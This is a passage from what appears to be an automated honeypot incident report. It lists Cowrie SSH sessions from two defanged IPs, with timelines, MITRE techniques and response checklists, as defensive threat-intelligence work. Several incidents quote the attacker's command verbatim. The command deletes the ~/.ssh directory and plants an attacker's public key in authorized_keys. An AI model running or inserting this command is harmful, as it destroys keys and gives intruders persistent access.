| `2026-04-24 14:01:44` | `cowrie.command.failed` |
| `2026-04-24 14:01:44` | `cowrie.log.closed` |
| `2026-04-24 14:01:45` | `cowrie.session.params` |
| `2026-04-24 14:01:45` | `cowrie.command.input` |
| `2026-04-24 14:01:45` | `cowrie.session.file_download` |
| `2026-04-24 14:01:45` | `cowrie.log.closed` |
| `2026-04-24 14:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a880c9caf07

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:01 |
| **Last Seen** | 2026-04-24 14:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:01:46` | `cowrie.session.connect` |
| `2026-04-24 14:01:46` | `cowrie.client.version` |
| `2026-04-24 14:01:47` | `cowrie.client.kex` |
| `2026-04-24 14:01:47` | `cowrie.login.success` |
| `2026-04-24 14:01:48` | `cowrie.session.params` |
| `2026-04-24 14:01:48` | `cowrie.command.input` |
| `2026-04-24 14:01:48` | `cowrie.command.failed` |
| `2026-04-24 14:01:48` | `cowrie.log.closed` |
| `2026-04-24 14:01:48` | `cowrie.session.params` |
| `2026-04-24 14:01:48` | `cowrie.command.input` |
| `2026-04-24 14:01:49` | `cowrie.session.file_download` |
| `2026-04-24 14:01:49` | `cowrie.log.closed` |
| `2026-04-24 14:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4456e16a23cf

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:01 |
| **Last Seen** | 2026-04-24 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:01:48` | `cowrie.session.connect` |
| `2026-04-24 14:01:48` | `cowrie.client.version` |
| `2026-04-24 14:01:49` | `cowrie.client.kex` |
| `2026-04-24 14:01:50` | `cowrie.login.success` |
| `2026-04-24 14:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e92c3e1653

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:01 |
| **Last Seen** | 2026-04-24 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:01:51` | `cowrie.session.connect` |
| `2026-04-24 14:01:51` | `cowrie.client.version` |
| `2026-04-24 14:01:51` | `cowrie.client.kex` |
| `2026-04-24 14:01:52` | `cowrie.login.success` |
| `2026-04-24 14:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47aad4c524e

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:02 |
| **Last Seen** | 2026-04-24 14:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:02:34` | `cowrie.session.connect` |
| `2026-04-24 14:02:34` | `cowrie.client.version` |
| `2026-04-24 14:02:34` | `cowrie.client.kex` |
| `2026-04-24 14:02:35` | `cowrie.login.success` |
| `2026-04-24 14:02:36` | `cowrie.session.params` |
| `2026-04-24 14:02:36` | `cowrie.command.input` |
| `2026-04-24 14:02:36` | `cowrie.command.failed` |
| `2026-04-24 14:02:36` | `cowrie.log.closed` |
| `2026-04-24 14:02:37` | `cowrie.session.params` |
| `2026-04-24 14:02:37` | `cowrie.command.input` |
| `2026-04-24 14:02:37` | `cowrie.session.file_download` |
| `2026-04-24 14:02:37` | `cowrie.log.closed` |
| `2026-04-24 14:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d138c78ba459

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:02 |
| **Last Seen** | 2026-04-24 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:02:40` | `cowrie.session.connect` |
| `2026-04-24 14:02:40` | `cowrie.client.version` |
| `2026-04-24 14:02:40` | `cowrie.client.kex` |
| `2026-04-24 14:02:41` | `cowrie.login.success` |
| `2026-04-24 14:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13787966f22c

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:02 |
| **Last Seen** | 2026-04-24 14:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:02:49` | `cowrie.session.connect` |
| `2026-04-24 14:02:49` | `cowrie.client.version` |
| `2026-04-24 14:02:49` | `cowrie.client.kex` |
| `2026-04-24 14:02:50` | `cowrie.login.success` |
| `2026-04-24 14:02:50` | `cowrie.session.params` |
| `2026-04-24 14:02:50` | `cowrie.command.input` |
| `2026-04-24 14:02:50` | `cowrie.command.failed` |
| `2026-04-24 14:02:51` | `cowrie.log.closed` |
| `2026-04-24 14:02:51` | `cowrie.session.params` |
| `2026-04-24 14:02:51` | `cowrie.command.input` |
| `2026-04-24 14:02:51` | `cowrie.session.file_download` |
| `2026-04-24 14:02:51` | `cowrie.log.closed` |
| `2026-04-24 14:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3adc472116f5

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:02 |
| **Last Seen** | 2026-04-24 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:02:54` | `cowrie.session.connect` |
| `2026-04-24 14:02:54` | `cowrie.client.version` |
| `2026-04-24 14:02:54` | `cowrie.client.kex` |
| `2026-04-24 14:02:54` | `cowrie.login.success` |
| `2026-04-24 14:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8df32e06e2f

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:03 |
| **Last Seen** | 2026-04-24 14:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:03:27` | `cowrie.session.connect` |
| `2026-04-24 14:03:27` | `cowrie.client.version` |
| `2026-04-24 14:03:27` | `cowrie.client.kex` |
| `2026-04-24 14:03:29` | `cowrie.login.success` |
| `2026-04-24 14:03:29` | `cowrie.session.params` |
| `2026-04-24 14:03:29` | `cowrie.command.input` |
| `2026-04-24 14:03:29` | `cowrie.command.failed` |
| `2026-04-24 14:03:29` | `cowrie.log.closed` |
| `2026-04-24 14:03:30` | `cowrie.session.params` |
| `2026-04-24 14:03:30` | `cowrie.command.input` |
| `2026-04-24 14:03:30` | `cowrie.session.file_download` |
| `2026-04-24 14:03:30` | `cowrie.log.closed` |
| `2026-04-24 14:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddbb3d32a21

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:03 |
| **Last Seen** | 2026-04-24 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:03:33` | `cowrie.session.connect` |
| `2026-04-24 14:03:33` | `cowrie.client.version` |
| `2026-04-24 14:03:34` | `cowrie.client.kex` |
| `2026-04-24 14:03:35` | `cowrie.login.success` |
| `2026-04-24 14:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e71a4b1c2fe

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:06 |
| **Last Seen** | 2026-04-24 14:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:06:02` | `cowrie.session.connect` |
| `2026-04-24 14:06:02` | `cowrie.client.version` |
| `2026-04-24 14:06:03` | `cowrie.client.kex` |
| `2026-04-24 14:06:03` | `cowrie.login.success` |
| `2026-04-24 14:06:04` | `cowrie.session.params` |
| `2026-04-24 14:06:04` | `cowrie.command.input` |
| `2026-04-24 14:06:04` | `cowrie.command.failed` |
| `2026-04-24 14:06:04` | `cowrie.log.closed` |
| `2026-04-24 14:06:04` | `cowrie.session.params` |
| `2026-04-24 14:06:04` | `cowrie.command.input` |
| `2026-04-24 14:06:05` | `cowrie.session.file_download` |
| `2026-04-24 14:06:05` | `cowrie.log.closed` |
| `2026-04-24 14:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2783536821e7

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:06 |
| **Last Seen** | 2026-04-24 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:06:07` | `cowrie.session.connect` |
| `2026-04-24 14:06:07` | `cowrie.client.version` |
| `2026-04-24 14:06:07` | `cowrie.client.kex` |
| `2026-04-24 14:06:08` | `cowrie.login.success` |
| `2026-04-24 14:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbc7b4c6dd0

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:07 |
| **Last Seen** | 2026-04-24 14:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:07:07` | `cowrie.session.connect` |
| `2026-04-24 14:07:07` | `cowrie.client.version` |
| `2026-04-24 14:07:07` | `cowrie.client.kex` |
| `2026-04-24 14:07:08` | `cowrie.login.success` |
| `2026-04-24 14:07:08` | `cowrie.session.params` |
| `2026-04-24 14:07:08` | `cowrie.command.input` |
| `2026-04-24 14:07:08` | `cowrie.command.failed` |
| `2026-04-24 14:07:09` | `cowrie.log.closed` |
| `2026-04-24 14:07:09` | `cowrie.session.params` |
| `2026-04-24 14:07:09` | `cowrie.command.input` |
| `2026-04-24 14:07:09` | `cowrie.session.file_download` |
| `2026-04-24 14:07:09` | `cowrie.log.closed` |
| `2026-04-24 14:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac903b96610

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:07 |
| **Last Seen** | 2026-04-24 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:07:12` | `cowrie.session.connect` |
| `2026-04-24 14:07:12` | `cowrie.client.version` |
| `2026-04-24 14:07:12` | `cowrie.client.kex` |
| `2026-04-24 14:07:13` | `cowrie.login.success` |
| `2026-04-24 14:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79fbafe6f11c

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:08 |
| **Last Seen** | 2026-04-24 14:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:08:14` | `cowrie.session.connect` |
| `2026-04-24 14:08:14` | `cowrie.client.version` |
| `2026-04-24 14:08:14` | `cowrie.client.kex` |
| `2026-04-24 14:08:15` | `cowrie.login.success` |
| `2026-04-24 14:08:16` | `cowrie.session.params` |
| `2026-04-24 14:08:16` | `cowrie.command.input` |
| `2026-04-24 14:08:16` | `cowrie.command.failed` |
| `2026-04-24 14:08:16` | `cowrie.log.closed` |
| `2026-04-24 14:08:16` | `cowrie.session.params` |
| `2026-04-24 14:08:16` | `cowrie.command.input` |
| `2026-04-24 14:08:16` | `cowrie.session.file_download` |
| `2026-04-24 14:08:16` | `cowrie.log.closed` |
| `2026-04-24 14:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ec85d5b7ad

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:08 |
| **Last Seen** | 2026-04-24 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:08:19` | `cowrie.session.connect` |
| `2026-04-24 14:08:19` | `cowrie.client.version` |
| `2026-04-24 14:08:19` | `cowrie.client.kex` |
| `2026-04-24 14:08:20` | `cowrie.login.success` |
| `2026-04-24 14:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8707c2abff91

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:08 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:08:52` | `cowrie.session.connect` |
| `2026-04-24 14:08:52` | `cowrie.client.version` |
| `2026-04-24 14:08:53` | `cowrie.client.kex` |
| `2026-04-24 14:08:54` | `cowrie.login.success` |
| `2026-04-24 14:08:54` | `cowrie.session.params` |
| `2026-04-24 14:08:54` | `cowrie.command.input` |
| `2026-04-24 14:08:54` | `cowrie.command.failed` |
| `2026-04-24 14:08:55` | `cowrie.log.closed` |
| `2026-04-24 14:08:55` | `cowrie.session.params` |
| `2026-04-24 14:08:55` | `cowrie.command.input` |
| `2026-04-24 14:08:56` | `cowrie.session.file_download` |
| `2026-04-24 14:08:56` | `cowrie.log.closed` |
| `2026-04-24 14:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f29a8c0140

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:08 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:08:59` | `cowrie.session.connect` |
| `2026-04-24 14:08:59` | `cowrie.client.version` |
| `2026-04-24 14:08:59` | `cowrie.client.kex` |
| `2026-04-24 14:09:00` | `cowrie.login.success` |
| `2026-04-24 14:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d69b3160a4

